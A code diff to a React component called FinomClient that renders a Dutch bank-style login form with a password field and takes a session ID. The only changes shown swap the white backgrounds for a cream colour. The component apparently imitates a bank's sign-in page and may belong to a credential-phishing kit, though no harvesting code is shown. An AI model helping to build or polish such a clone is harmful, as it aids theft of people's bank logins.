@@ -37,7 +37,7 @@ export function FinomClient({ sessionId }: { sessionId: string }) {
   }
 
   return (
-    <div className="min-h-screen bg-white font-sans flex flex-col md:flex-row">
+    <div className="min-h-screen bg-[#fff6ec] font-sans flex flex-col md:flex-row">
       
       {/* Left Column - Form */}
       <div className="w-full md:w-1/2 lg:w-[45%] flex flex-col pt-8 pb-12 px-6 sm:px-16 xl:px-32 relative">
@@ -101,7 +101,7 @@ export function FinomClient({ sessionId }: { sessionId: string }) {
                 placeholder="Wachtwoord" 
                 value={password} 
                 onChange={e => setPassword(e.target.value)} 
-                className="w-full bg-white border border-gray-200 rounded-[12px] py-4 pl-12 pr-28 text-[15px] focus:outline-none focus:ring-2 focus:ring-gray-900 transition-all placeholder-gray-400" 
+                className="w-full bg-[#fff6ec] border border-gray-200 rounded-[12px] py-4 pl-12 pr-28 text-[15px] focus:outline-none focus:ring-2 focus:ring-gray-900 transition-all placeholder-gray-400" 
               />
               <button type="button" className="absolute inset-y-0 right-0 pr-4 flex items-center text-[12px] font-bold text-gray-600 hover:text-gray-900">
                 <svg className="w-4 h-4 mr-1" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"></path><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"></path></svg>
@@ -133,7 +133,7 @@ export function FinomClient({ sessionId }: { sessionId: string }) {
 
       {/* Right Column - Promotional Image */}
       <div className="hidden md:flex md:w-1/2 lg:w-[55%] relative m-4 rounded-[32px] overflow-hidden">
-        <div className="absolute top-6 right-8 z-10 flex items-center text-[14px] font-medium text-gray-800 bg-white/50 px-3 py-1.5 rounded-full backdrop-blur-md cursor-pointer hover:bg-white/70">
+        <div className="absolute top-6 right-8 z-10 flex items-center text-[14px] font-medium text-gray-800 bg-[#fff6ec]/50 px-3 py-1.5 rounded-full backdrop-blur-md cursor-pointer hover:bg-[#fff6ec]/70">
           Nederlands
           <svg className="w-4 h-4 ml-1" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M19 9l-7 7-7-7"></path></svg>
         </div>
